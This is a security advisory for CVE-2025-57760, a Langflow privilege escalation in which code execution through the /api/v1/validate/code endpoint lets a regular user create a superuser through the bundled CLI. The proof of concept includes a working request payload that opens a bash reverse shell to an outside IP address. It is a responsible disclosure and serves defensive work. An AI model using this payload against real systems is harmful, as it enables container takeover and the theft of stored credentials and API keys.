# Langflow Vulnerable to Privilege Escalation via CLI Superuser Creation (Post-RCE)

**GHSA**: GHSA-4gv9-mp8m-592r | **CVE**: CVE-2025-57760 | **Severity**: high (CVSS 8.8)

**CWE**: CWE-269

**Affected Packages**:
- **langflow** (pip): <= 1.5.0
- **langflow-base** (pip): <= 0.5.0

## Description

This vulnerability was discovered by researchers at **Check Point**. We are sharing this report as part of a responsible disclosure process and are happy to assist in validation and remediation if needed.

### Summary
A privilege escalation vulnerability exists in Langflow containers where an authenticated user with RCE access can invoke the internal CLI command **langflow superuser** to create a new administrative user. This results in full superuser access, even if the user initially registered through the UI as a regular (non-admin) account.

### Details
Langflow's Docker image includes a CLI binary at /app/.venv/bin/langflow that exposes sensitive commands, including:

`langflow superuser`

This command allows creation of a new superuser without checking whether one already exists. 

When combined with code execution (e.g., via the authenticated **/api/v1/validate/code** endpoint), a low-privileged user can execute:

`/app/.venv/bin/langflow superuser`

inside the container, and elevate themselves to full superuser privileges.

This effectively bypasses frontend role enforcement and backend user integrity, leading to full compromise of the Langflow application.

### PoC
1. Start container with LANGFLOW_ENABLE_AUTH set to True.
2. Visit http://localhost:7860 and sign up. (Your user will not be marked is_superuser.)

<img width="1311" height="627" alt="image" src="https://github.com/user-attachments/assets/9b75bdc3-31ea-48c0-9e84-c2b168f404b3" />

3. Exploit /api/v1/validate/code to get reverse shell

Send an authenticated POST request:

```
{
  "code": "def foo(p=__import__('os').system(\"bash -c 'bash -i >& /dev/tcp/192.168.1.22/4444 0>&1'\")):\n    pass"
}
```

4. Inside reverse shell, create superuser:


<img width="731" height="217" alt="image" src="https://github.com/user-attachments/assets/cb8497c6-0d61-414e-afe2-69bbbaf55cbc" />


5. Log into UI as new superuser:

<img width="1262" height="532" alt="image" src="https://github.com/user-attachments/assets/1f0a713d-3d61-4aa4-a25b-58f4b58c061b" />


### Impact

- Privilege escalation to superuser — complete takeover of the Langflow instance
- Access to all user data, flows, stored credentials, and configuration
- Credential leakage — attacker can extract third-party API keys 
- Exposure of environment variables (inside docker container)
- Ability to run additional Langflow instances via `langflow run` inside the container, which may lead to resource exhaustion (CPU, memory) and service degradation.
- Full user management — superuser can delete other users, reset their passwords
